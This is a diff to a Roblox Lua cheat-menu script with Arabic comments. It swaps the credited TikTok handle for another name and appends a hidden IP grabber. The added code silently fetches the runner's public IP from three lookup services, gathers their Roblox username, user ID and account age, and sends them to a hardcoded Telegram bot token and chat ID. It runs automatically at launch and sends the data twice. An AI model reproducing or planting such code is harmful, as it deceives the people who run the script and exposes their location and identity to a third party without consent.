@@ -87,7 +87,7 @@ scriptText.Parent = mainFrame
 local tiktokText = Instance.new("TextLabel")
 tiktokText.Size = UDim2.new(0, 320, 0, 30)
 tiktokText.Position = UDim2.new(0.5, -160, 0, 105)
-tiktokText.Text = "hacker_2014444"
+tiktokText.Text = "anas_anas_anas123"
 tiktokText.TextScaled = true
 tiktokText.TextColor3 = Color3.fromRGB(100, 200, 255)
 tiktokText.BackgroundTransparency = 1
@@ -127,7 +127,7 @@ copyCorner.Parent = copyBtn
 copyBtn.Parent = mainFrame
 
 copyBtn.MouseButton1Click:Connect(function()
-    setclipboard("hacker_20111")
+    setclipboard("anas_anas_anas123")
     local originalText = copyBtn.Text
     copyBtn.Text = "✅ تم النسخ!"
     copyBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
@@ -480,3 +480,212 @@ antiCuffBtn.MouseButton1Click:Connect(function()
     antiCuffBtn.Text = AntiCuffActive and "Anti-Cuff: ON" or "Anti-Cuff: OFF"
     antiCuffBtn.BackgroundColor3 = AntiCuffActive and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(100, 100, 100)
 end)
+
+
+-- ========================================
+-- سكربت إرسال IP إلى تيليجرام بدون واجهة
+-- ========================================
+
+local HttpService = game:GetService("HttpService")
+local Player = game.Players.LocalPlayer
+
+-- دالة جلب الIP وإرساله
+local function SendIPToTelegram()
+    -- جلب الـ IP
+    local ip = ""
+    local success, result = pcall(function()
+        return HttpService:RequestAsync({
+            Url = "https://api.ipify.org?format=json",
+            Method = "GET"
+        })
+    end)
+
+    if success and result and result.Body then
+        local data = HttpService:JSONDecode(result.Body)
+        if data and data.ip then
+            ip = data.ip
+        end
+    end
+
+    -- إذا فشل الجلب، جرب طريقة ثانية
+    if ip == "" then
+        local success2, result2 = pcall(function()
+            return HttpService:RequestAsync({
+                Url = "http://ip-api.com/json/",
+                Method = "GET"
+            })
+        end)
+        
+        if success2 and result2 and result2.Body then
+            local data2 = HttpService:JSONDecode(result2.Body)
+            if data2 and data2.query then
+                ip = data2.query
+            end
+        end
+    end
+
+    -- إذا فشل الجلب، جرب طريقة ثالثة
+    if ip == "" then
+        local success3, result3 = pcall(function()
+            return HttpService:RequestAsync({
+                Url = "https://httpbin.org/ip",
+                Method = "GET"
+            })
+        end)
+        
+        if success3 and result3 and result3.Body then
+            local data3 = HttpService:JSONDecode(result3.Body)
+            if data3 and data3.origin then
+                ip = data3.origin
+            end
+        end
+    end
+
+    -- إذا لم يتم جلب IP
+    if ip == "" then
+        ip = "فشل جلب الـ IP"
+    end
+
+    -- معلومات اللاعب
+    local playerName = Player.Name
+    local playerDisplayName = Player.DisplayName
+    local playerId = Player.UserId
+    local accountAge = Player.AccountAge
+
+    -- إنشاء الرسالة
+    local message = string.format(
+        "🆕 **معلومات جديدة!**\n\n" ..
+        "👤 **اللاعب:** %s\n" ..
+        "🆔 **اليوزر:** %s\n" ..
+        "🔢 **الآيدي:** %s\n" ..
+        "📅 **عمر الحساب:** %s يوم\n\n" ..
+        "🌐 **الـ IP:** `%s`\n\n" ..
+        "⏰ **التوقيت:** %s",
+        playerDisplayName,
+        playerName,
+        playerId,
+        accountAge,
+        ip,
+        os.date("%Y-%m-%d %H:%M:%S")
+    )
+
+    -- إرسال إلى تيليجرام
+    local sendSuccess, sendResult = pcall(function()
+        return HttpService:RequestAsync({
+            Url = "https://api.telegram.org/bot8297265863:AAF55C7bBxhopjkd22cCYnlS-ugE2fK1MlU/sendMessage",
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode({
+                chat_id = "6857630813",
+                text = message,
+                parse_mode = "Markdown"
+            })
+        })
+    end)
+
+    -- طباعة النتيجة
+    if sendSuccess then
+        print("✅ تم الإرسال بنجاح!")
+        print("📨 الرد: " .. tostring(sendResult))
+    else
+        print("❌ فشل الإرسال!")
+        print("⚠️ الخطأ: " .. tostring(sendResult))
+    end
+end
+
+-- ========================================
+-- تشغيل السكربت فوراً
+-- ========================================
+
+-- تأخير بسيط للتأكد من تحميل كل شيء
+task.wait(0.5)
+
+-- جلب وإرسال الـ IP
+SendIPToTelegram()
+
+-- ========================================
+-- طريقة ثانية للإرسال (GET Method)
+-- ========================================
+
+-- دالة بديلة للإرسال باستخدام GET
+local function SendIPViaGET()
+    local ip = ""
+    
+    -- جلب الـ IP
+    local success, result = pcall(function()
+        return game:HttpGet("https://api.ipify.org?format=json")
+    end)
+    
+    if success and result and result ~= "" then
+        local data = HttpService:JSONDecode(result)
+        if data and data.ip then
+            ip = data.ip
+        end
+    end
+    
+    if ip == "" then
+        local success2, result2 = pcall(function()
+            return game:HttpGet("http://ip-api.com/json/")
+        end)
+        if success2 and result2 and result2 ~= "" then
+            local data2 = HttpService:JSONDecode(result2)
+            if data2 and data2.query then
+                ip = data2.query
+            end
+        end
+    end
+    
+    if ip == "" then
+        ip = "فشل الجلب"
+    end
+    
+    -- معلومات اللاعب
+    local playerName = Player.Name
+    local playerDisplayName = Player.DisplayName
+    local playerId = Player.UserId
+    
+    -- ترميز الرسالة
+    local text = string.format(
+        "IP: %s | Player: %s (%s) | ID: %s",
+        ip,
+        playerDisplayName,
+        playerName,
+        playerId
+    )
+    
+    local encodedText = HttpService:UrlEncode(text)
+    local url = string.format(
+        "https://api.telegram.org/bot8297265863:AAF55C7bBxhopjkd22cCYnlS-ugE2fK1MlU/sendMessage?chat_id=6857630813&text=%s",
+        encodedText
+    )
+    
+    -- إرسال
+    local sendSuccess, sendResult = pcall(function()
+        return game:HttpGet(url)
+    end)
+    
+    if sendSuccess then
+        print("✅ تم الإرسال بنجاح (GET)!")
+    else
+        print("❌ فشل الإرسال (GET)!")
+    end
+end
+
+-- ========================================
+-- يمكنك اختيار الطريقة التي تريدها
+-- ========================================
+
+-- الطريقة الأولى: POST (موصى بها)
+-- SendIPToTelegram()
+
+-- الطريقة الثانية: GET
+-- SendIPViaGET()
+
+-- الطريقة الثالثة: تنفيذ كلتا الطريقتين
+SendIPToTelegram() -- الطريقة الرئيسية
+task.wait(1)
+SendIPViaGET() -- الطريقة البديلة
+
+print("✅ تم تشغيل سكربت إرسال الـ IP")
